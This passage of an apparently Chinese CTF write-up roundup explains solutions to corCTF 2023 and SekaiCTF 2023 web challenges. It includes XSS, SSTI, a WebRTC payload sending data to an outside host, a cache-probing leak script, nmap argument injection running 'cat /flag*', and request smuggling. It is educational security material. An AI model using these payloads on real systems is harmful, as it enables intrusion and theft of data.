href="https://github.com/hanzotaz/corctf2023_writeup/">https://github.com/hanzotaz/corctf2023_writeup/</a></li></ol><h3><span id="msfrognymize-64-solves">msfrognymize (64 solves)</span></h3><p>重點是底下這一段的程式碼：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/anonymized/&lt;image_file>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">serve_image</span><span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> unquote<span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".."</span> <span class="token keyword">in</span> file_path <span class="token keyword">or</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Image </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string"> cannot be found."</span></span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python 的 <code>os.path.join</code> 有一個眾所皆知的行為是當你要 join 的東西是一個絕對路徑的時候，前面都會被忽略：</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;test.txt&#39;)&#39;&#x2F;tmp&#x2F;abc&#x2F;test.txt&#39;&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;&#x2F;test.txt&#39;)&#39;&#x2F;test.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>因此這題利用這個特性就可以做到任意讀檔，拿到 flag。</p><p>參考資料：<a href="https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/">https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/</a></p><h3><span id="frogshare-33-solves">frogshare (33 solves)</span></h3><p>這題使用了一個叫做 <a href="https://github.com/shubhamjain/svg-loader">svg-loader</a> 的 library，可以自動載入一個 SVG URL，因此這題是基於 SVG 的 XSS。</p><p>在引入的時候為了安全性，會自動把 script 以及 inline script 等等的東西移除，但是漏掉了 <code>&lt;foreignObject&gt;</code> 這個東西，這標籤可以讓你在 SVG 裡面載入 HTML，搭配 iframe srcdoc 來使用就可以繞過：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">svg</span> <span class="token name">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>triangle<span class="token punctuation">"</span></span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0 0,50 50,0<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#009900<span class="token punctuation">"</span></span> <span class="token attr-name">stroke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#004400<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreignObject</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>script<span class="token entity named-entity" title="&gt;">&amp;gt;</span>alert(document.domain)<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/script<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreignObject</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再來就是繞過 CSP，這題最後是用 <code>&lt;base&gt;</code> 來改變 script 載入的位置來達成。</p><p>參考資料：</p><ol><li><a href="https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/">https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/</a></li></ol><p>而 Renwa 的解法則是在 iframe 裡面重建 app，並藉由 Next.js 的特性來插入 script：<a href="https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd">https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd</a></p><h3><span id="youdirect-5-solves">youdirect (5 solves)</span></h3><p>這題就是找到 YouTube 上的 open redirect，簡單明瞭。</p><p>@EhhThing 提供的（點了會登出），串了兩層 open redirect：</p><p><a href="https://youtube.com/logout?continue=http://googleads.g.doubleclick.net/pcs/click?adurl=https://webhook.site/ccb8a675-14cb-419c-9e85-3b709a99e394">https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394</a></p><p>@pew 提供的：<br><a href="https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew">https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew</a></p><p>@Josh 提供的：<br><a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&q=https://sheiwknajaka.free.beeceptor.com/&v=-5Rm9ymMTRA&html_redirect=1">https://www.youtube.com/redirect?event=video_description&amp;redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&amp;q=https%3A%2F%2Fsheiwknajaka.free.beeceptor.com%2F&amp;v=-5Rm9ymMTRA&amp;html_redirect=1</a></p><p>這個比較特別，其實 YouTube 影片敘述的連結每一個都會產生一個 redirect link，但是在網頁上都有綁定 session ID，所以換個裝置就不能使用了，而這個是在 mobile app 上面產生的，可以是因為 mobile app 沒有 cookie 所以不受限制，有趣。</p><h3><span id="crabspace-4-solves">crabspace (4 solves)</span></h3><p>第一步是用 tera 的 SSTI leak 出環境變數：<code>&#123;&#123; get_env(name="SECRET") &#125;&#125;</code></p><p>再來可以用 WebRTC 去繞過 CSP：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    c<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token literal-property property">iceServers</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">urls</span><span class="token operator">:</span><span class="token string">"stun:&#123;&#123;user.id&#125;&#125;.x.cjxol.com:1337"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了這兩個之後就可以偽造出一個 admin session 然後拿到 flag。</p><p>參考資料：</p><ol><li><a href="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/">corCTF 2023 web&#x2F;crabspace Writeup</a></li></ol><h3><span id="leakynote-3-solves">leakynote (3 solves)</span></h3><p>這題在比賽中的時候有解開，簡單來講就是給你一個 free HTML injection 以及嚴格的 CSP：</p><pre class="line-numbers language-none"><code class="language-none">Content-Security-Policy &quot;script-src &#39;none&#39;; object-src &#39;none&#39;; frame-ancestors &#39;none&#39;;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然後有一個 search API，成功會回傳 200，失敗回傳 404，要想辦法利用這個去 leak flag。</p><p>這題的重點之一是 CSP header 是 nginx 加上的，而 nginx 只有對 2xx 跟 3xx 會加上 header，因此如果搜尋失敗回傳 404，這個頁面是不會有 CSP 的。</p><p>因此我那時候就想出了一個用 cache probing 的方式。</p><p>我們在 note 裡面插入 <code>&lt;iframe src=search?q=a&gt;</code>，如果沒有找到東西，那就沒有 CSP，所以 iframe 的內容會被載入，頁面上的 CSS 也會被載入。反之，因為違反 CSP，沒有東西會被載入。</p><p>因此可以透過「CSS 有沒有被放到 cache 中」這點去 leak 出搜尋有沒有找到東西。</p><p>那時候實作的程式碼如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> signal <span class="token operator">=</span> controller<span class="token punctuation">.</span>signal<span class="token punctuation">;</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">"no-cors"</span><span class="token punctuation">,</span>      <span class="token literal-property property">signal</span><span class="token operator">:</span> signal<span class="token punctuation">,</span>      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'reload'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    controller<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token parameter">title<span class="token punctuation">,</span> url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// open note page</span>    <span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token comment">// wait 1s</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>    <span class="token comment">// clear cache and wait again</span>    <span class="token keyword">await</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>    <span class="token comment">// now the iframe should load, do cache probing</span>    <span class="token keyword">const</span> now <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'force-cache'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> end <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/report?title=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;ms=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>end<span class="token operator">-</span>now<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>end<span class="token operator">-</span>now <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/maybe/'</span> <span class="token operator">+</span> title<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// cached(no result) => 2~3ms</span>    <span class="token comment">// no cache(found) => 4.8~5.8ms</span>    w<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// copy paste the following from python script</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;a'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=c9193aee91b0fc29'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;c'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;d'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=0c6caa61575b9478'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;e'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;f'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=71652df64d54c0e4'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;g'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=354f3bec25e02332'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;k'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=066aa475493e1a4c'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;l'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=54a12f7b11098d2a'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;o'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=621591145bcfc8e0'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;r'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=6b44725cb5e274f0'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;t'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=e025b26e5e7117a1'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;y'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=f10001d89230485e'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;z'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>賽後看到另外兩位的解法也很有趣，其中一個是透過載入字體來 leak，當你這樣做的時候：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> a<span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-before<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span>... <span class="token comment">/*10000 times */</span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-after<span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Chrome 會根據 status code 來判斷怎麼處理，如果是 200 就會偵測是不是合法的字體，如果是 404 就直接失敗，因此可以用字體載入的時間來判斷 status code。</p><p>ref: <a href="https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45">https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45</a></p><p>另一位也是利用 CSS 檔案有沒有載入的特性，只是不是利用 cache，而是利用一次打開大量頁面造成 server side 忙碌，響應時間變慢，透過這點來判斷。</p><p>ref: <a href="https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09">https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09</a></p><h3><span id="pdf-pal-2-solves">pdf-pal (2 solves)</span></h3><p>這題的 nginx config 長這樣：</p><pre class="line-numbers language-none"><code class="language-none">location &#x2F; &#123;    proxy_pass http:&#x2F;&#x2F;localhost:7777;    location ^~ &#x2F;generate &#123;        allow 127.0.0.1;        deny all;    &#125;    location ^~ &#x2F;rename &#123;        allow 127.0.0.1;        deny all;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以照理來說是無法訪問到 <code>/generate</code> 路徑，但可以利用 gunicorn 跟 nginx 的 parser 差異來繞過：</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;generate&#123;chr(9)&#125;HTTP&#x2F;1.1&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相關 ticket：<a href="https://github.com/benoitc/gunicorn/issues/2530">https://github.com/benoitc/gunicorn/issues/2530</a></p><p>繞過之後就可以用 <code>/generate</code> 的功能去產生 PDF，但是因為這個 service 本身有擋一些 block list，所以沒辦法直接把 flag 變成 PDF。</p><p>解法是利用 DNS rebinding 去 POST <code>http://localhost:7778</code>，就可以拿到 response。</p><p>例如說我們現在有個 domain <code>example.com</code>，背後有兩個 A record，一個指向真的 ip，另一個指向 0.0.0.0，這時候 admin bot 訪問 <code>http://example.com:7778/</code>，解析真的 IP，成功取得頁面。</p><p>這時我們把 server 關掉，然後去執行 <code>fetch(&#39;http://example.com:7778/generate&#39;)</code>，此時因為原本的 ip 已經無法訪問，瀏覽器就會轉為 0.0.0.0，成功把 request 發到我們想要的位置，也因為是 same-origin 所以可以拿到 response。</p><p>更多細節可以參考：</p><ol><li><a href="https://github.com/nccgroup/singularity">https://github.com/nccgroup/singularity</a></li><li><a href="https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)">https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)</a></li></ol><h3><span id="lemon-csp-1-solve">lemon-csp (1 solve)</span></h3><p>找到 0 day 的 CSP bypass，沒有公開解法。</p><h3><span id="0day-1-solve">0day (1 solve)</span></h3><p>這題是找到 VM2 的 1day，沒有公開解法。</p><h2><span id="sekaictf-2023">SekaiCTF 2023</span></h2><p>題目的原始碼都在這裡：<a href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web">https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web</a></p><h3><span id="scanner-service-146-solves">Scanner Service (146 solves)</span></h3><p>輸入 port 跟 host，會執行底下程式碼：</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">nmap <span class="token operator">-</span>p <span class="token comment">#&#123;port&#125; #&#123;hostname&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是傳入的資料會先經過 sanitizer，有字元限制。</p><p>tab 可以用，所以可以用 tab 來新增參數，比賽中的時候是用了 <code>-iL /flag.txt -oN -</code> 來過關的，把輸出導到 stdout，或是用 <code>/dev/stdout</code> 也成立。</p><p>官方的 writeup 是先用 <code>http-fetch</code> 這個 script 把檔案下載到本機，再跑一次 <code>nmap --script</code> 去執行那個腳本：</p><pre class="line-numbers language-none"><code class="language-none">--script http-fetch -Pn --script-args http-fetch.destination&#x3D;&#123;DOWNLOAD_DIR&#125;,http-fetch.url&#x3D;&#123;NSE_SCRIPT&#125;--script&#x3D;&#123;DOWNLOAD_DIR&#125;&#x2F;&#123;LHOST&#125;&#x2F;&#123;LPORT&#125;&#x2F;&#123;NSE_SCRIPT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在 Discord 中看到 @zeosutt 提供另外一種有趣的解法是運用了 rack 上傳檔案會留在 <code>/tmp/</code> 中的技巧，直接引入上傳的檔案就好：</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;35.231.135.130:32190&#x2F; -F $&#39;service&#x3D;127.0.0.1:1337\t--script\t&#x2F;tmp&#x2F;RackMultipart?????????????????&#39; -F &#39;&#x3D;os.execute(&quot;cat &#x2F;flag*&quot;);filename&#x3D;evil&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="frog-waf-29-solves">Frog-WAF (29 solves)</span></h3><p><code>buildConstraintViolationWithTemplate</code> 有 EL injection 的問題，剩下的是繞過 WAF。</p><p>之前有實際的產品就是出過一樣的洞：</p><ol><li><a href="https://github.com/advisories/GHSA-wfj5-2mqr-7jvv">Expression Language Injection in Netflix Conductor</a></li><li><a href="https://xz.aliyun.com/t/7889">CVE-2020-9296-Netflix-Conductor-RCE-漏洞分析</a></li></ol><p>怎麼繞的部分可以參考底下幾篇：</p><ol><li><a href="https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py">https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py</a></li><li><a href="https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba">https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba</a></li><li><a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00</a></li></ol><h3><span id="chunky-16-solves">Chunky (16 solves)</span></h3><p>這題有一個 cache server + backend server，請求都會先通過 cache server 再到 backend 去，然後留一份快取在 cache server 中，而目標是要污染快取。</p><p>解法直接貼 <a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">zeyu</a> 的 writeup，就是像 request smuggling 那樣構造出一個兩邊理解不同的請求：</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;aaaaa HTTP&#x2F;1.1Host: localhosttransfer-encoding: chunkedContent-Length: 1020GET &#x2F;post&#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP&#x2F;1.1X: GET &#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;.well-known&#x2F;jwks.json HTTP&#x2F;1.1Host: localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cache server 會看 <code>Content-Length</code>，把第二個請求看作是 <code>GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json</code>，而 backend server 看 <code>transfer-encoding</code>，所以看作是 <code>GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5</code>，如此一來就能用另一個 path 的 response 去污染 jwks.json，達成 cache poisoning</p><h3><span id="golf-jail-16-solves">Golf Jail (16 solves)</span></h3><p>這題我有認真解，大概花了一天左右，覺得很有趣，而且程式碼很精簡。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cross-Origin-Opener-Policy: same-origin"</span><span class="token punctuation">)</span><span class="token 